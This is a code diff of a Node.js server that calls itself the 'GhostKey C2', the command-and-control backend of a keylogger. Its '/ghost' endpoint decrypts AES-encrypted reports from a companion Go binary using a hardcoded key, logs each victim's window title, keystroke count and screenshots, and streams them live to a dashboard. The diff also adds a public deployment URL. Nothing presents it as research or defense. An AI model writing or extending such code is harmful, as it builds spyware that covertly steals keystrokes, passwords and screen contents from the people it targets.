@@ -1,5 +1,4 @@
 const express = require('express');
-const sqlite3 = require('sqlite3').verbose();
 const CryptoJS = require('crypto-js');
 const bodyParser = require('body-parser');
 const cors = require('cors');
@@ -7,72 +6,79 @@ const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-const AES_KEY = "x93mK!qWeR7zL9p&2vN8bT5cY4fU6jH0";  // ←←← SAME AS YOUR GO BINARY
+const AES_KEY = "x93mK!qWeR7zL9p&2vN8bT5cY4fU6jH0";  // ←←← SAME AS GO BINARY
 
 app.use(cors());
-app.use(bodyParser.json({ limit: '15mb' }));
-app.use(express.static('public'));
+app.use(bodyParser.json({ limit: '20mb' }));
+app.use(express.static(path.join(__dirname, 'public')));
 
-// SSE clients array
+// Explicit root route (critical for Render)
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// SSE clients
 const clients = [];
 
-// SSE endpoint
 app.get('/events', (req, res) => {
   res.setHeader('Content-Type', 'text/event-stream');
   res.setHeader('Cache-Control', 'no-cache');
   res.setHeader('Connection', 'keep-alive');
+  res.flushHeaders();
 
-  // Send a comment to keep connection open
-  res.write(':ok\n\n');
-
-  // Add client to list
+  res.write(': connected\n\n');
   clients.push(res);
 
-  // Remove client on close
   req.on('close', () => {
-    const index = clients.indexOf(res);
-    if (index !== -1) {
-      clients.splice(index, 1);
-    }
+    clients.splice(clients.indexOf(res), 1);
   });
 });
 
-// Broadcast function to send data to all clients
 function broadcast(data) {
-  clients.forEach((client) => {
+  clients.forEach(client => {
     try {
       client.write(`data: ${JSON.stringify(data)}\n\n`);
-    } catch (err) {
-      // Ignore errors if client connection is closed
-    }
+    } catch (e) { /* ignore dead clients */ }
   });
 }
 
-// decrypt (matches Go binary)
+// Decrypt exactly like Go binary (AES-CBC + PKCS7 + IV prepended)
 function decrypt(b64) {
   try {
-    const bytes = CryptoJS.AES.decrypt(b64, AES_KEY);
-    return JSON.parse(bytes.toString(CryptoJS.enc.Utf8));
+    const raw = CryptoJS.enc.Base64.parse(b64);
+    const iv = CryptoJS.enc.Base64.stringify(raw.clone().splice(0, 16));
+    const ciphertext = CryptoJS.enc.Base64.stringify(raw.clone().splice(16));
+
+    const decrypted = CryptoJS.AES.decrypt(ciphertext, CryptoJS.enc.Utf8.parse(AES_KEY), {
+      iv: CryptoJS.enc.Base64.parse(iv),
+      mode: CryptoJS.mode.CBC,
+      padding: CryptoJS.pad.Pkcs7
+    });
+    return JSON.parse(decrypted.toString(CryptoJS.enc.Utf8));
   } catch (e) {
-    console.log("Decrypt failed");
+    console.log("Decrypt failed:", e.message);
     return null;
   }
 }
 
-// legacy browser logs
-app.post('/log', (req, res) => res.json({ success: true }));
-
-// native GhostKey logs
+// Main C2 endpoint
 app.post('/ghost', (req, res) => {
   const payload = decrypt(req.body.data);
   if (payload) {
-    console.log(`→ ${payload.client} | ${payload.win} | ${payload.keys.length} keys${payload.Screenshot ? ' + screenshot' : ''}`);
-    // Broadcast the payload to SSE clients
-    broadcast({ message: 'New ghost log', payload });
+    console.log(`[+] ${payload.Client} | ${payload.Window} | ${payload.Keys?.length || 0} keys${payload.Screenshot ? ' + screenshot' : ''}`);
+    broadcast(payload);  // ← sends raw payload with correct capital letters
   }
   res.json({ success: true });
 });
 
+// Legacy fallback
+app.post('/log', (req, res) => res.json({ success: true }));
+
+// 404 fallback
+app.use((req, res) => {
+  res.status(404).send("GhostKey C2 — No route");
+});
+
 app.listen(PORT, () => {
-  console.log(`Dashboard running → http://localhost:${PORT}`);
+  console.log(`GhostKey Dashboard LIVE → https://fs-tracker-online-ghost.onrender.com`);
 });
